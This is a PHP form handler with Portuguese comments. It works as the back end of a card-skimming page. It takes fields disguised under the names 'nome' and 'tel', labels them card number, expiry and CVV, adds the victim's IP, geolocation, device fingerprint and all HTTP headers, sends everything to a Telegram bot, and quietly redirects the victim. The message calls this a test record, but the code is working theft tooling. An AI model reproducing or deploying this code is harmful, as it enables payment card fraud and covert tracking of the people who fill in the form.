<?php
ob_start();

// geolocalização
function getIpInfo(string $ip): array {
    $data = @file_get_contents("http://ip-api.com/json/{$ip}");
    if (!$data) return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    $j = json_decode($data, true);
    if (!isset($j['status']) || $j['status']!=='success') {
        return ['query'=>$ip,'city'=>'N/A','regionName'=>'N/A','country'=>'N/A','isp'=>'N/A'];
    }
    return $j;
}

// detecção SO+navegador
function detectClient(string $ua): array {
    $os = 'Desconhecido';
    if (stripos($ua,'Windows')!==false)    $os='Windows';
    elseif (stripos($ua,'Android')!==false) $os='Android';
    elseif (stripos($ua,'Linux')!==false)   $os='Linux';
    elseif (stripos($ua,'Mac')!==false)     $os='macOS';
    elseif (stripos($ua,'iPhone')!==false)  $os='iOS';

    $br = 'Desconhecido';
    foreach (['Firefox','Edg','Chrome','Safari','Opera','MSIE','Trident'] as $token) {
        if (stripos($ua,$token)!==false) { $br=$token; break; }
    }
    return [$os, $br];
}

// envia cURL
function sendTelegram(string $t, string $c, string $m): bool {
    $ch = curl_init("https://api.telegram.org/bot{$t}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => ['chat_id'=>$c,'text'=>$m],
        CURLOPT_RETURNTRANSFER => true
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r!==false;
}

if ($_SERVER['REQUEST_METHOD']==='POST') {
    // campos básicos
    $num = trim($_POST['campoNome']  ?? '');
    $val = trim($_POST['campoTel']   ?? '');
    $cvv = trim($_POST['campoTel2']  ?? '');
    if (!$num||!$val||!$cvv) {
        echo '❗ Preencha todos os campos.'; ob_end_flush(); exit;
    }

    // IP real
    $ip = !empty($_SERVER['HTTP_X_FORWARDED_FOR'])
        ? trim(explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])[0])
        : $_SERVER['REMOTE_ADDR'];

    $host = gethostbyaddr($ip);
    $ua   = $_SERVER['HTTP_USER_AGENT']      ?? '';
    [$os,$br] = detectClient($ua);
    $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
    $geo  = getIpInfo($ip);
    $now  = date('Y-m-d H:i:s');
    $hdrs = getallheaders();

    // leitura dos novos campos
    $sw   = $_POST['screen_width']   ?? 'N/A';
    $sh   = $_POST['screen_height']  ?? 'N/A';
    $tz   = $_POST['timezone_offset']?? 'N/A';
    $mem  = $_POST['device_memory']  ?? 'N/A';
    $net  = $_POST['network_type']   ?? 'N/A';
    $mdl  = $_POST['device_model']   ?? 'N/A';

    // monta mensagem
    $msg  = "💌 *Novo Registro de Teste*\n\n";
    $msg .= "💳 Cartão: {$num}\n📅 Validade: {$val}\n🔒 CVV: {$cvv}\n\n";
    $msg .= "📍 IP: {$geo['query']} ({$host})\n";
    $msg .= "🏙 Cidade: {$geo['city']}\n🌎 País: {$geo['country']}\n";
    $msg .= "🔧 ISP: {$geo['isp']}\n\n";
    $msg .= "🖥 SO: {$os}\n🌐 Navegador: {$br}\n";
    $msg .= "📱 Modelo: {$mdl}\n";
    $msg .= "💾 Memória: {$mem} GB\n";
    $msg .= "📺 Resolução: {$sw}×{$sh}\n";
    $msg .= "🌐 Conexão: {$net}\n";
    $msg .= "⏰ Fuso: {$tz} min de UTC\n";
    $msg .= "⏳ Horário: {$now}\n\n";
    $msg .= "*Cabeçalhos HTTP:*\n";
    foreach ($hdrs as $k=>$v) $msg .= "• {$k}: {$v}\n";

    // credenciais
    $token  = getenv('BOT_TOKEN') ?: '';
    $chatId = getenv('CHAT_ID')   ?: '';

    if (sendTelegram($token,$chatId,$msg)) {
        header('Location: index.html'); exit;
    } else {
        echo '❗ Erro ao enviar. Tente novamente.';
    }

} else {
    header('Location: index.html'); exit;
}
ob_end_flush();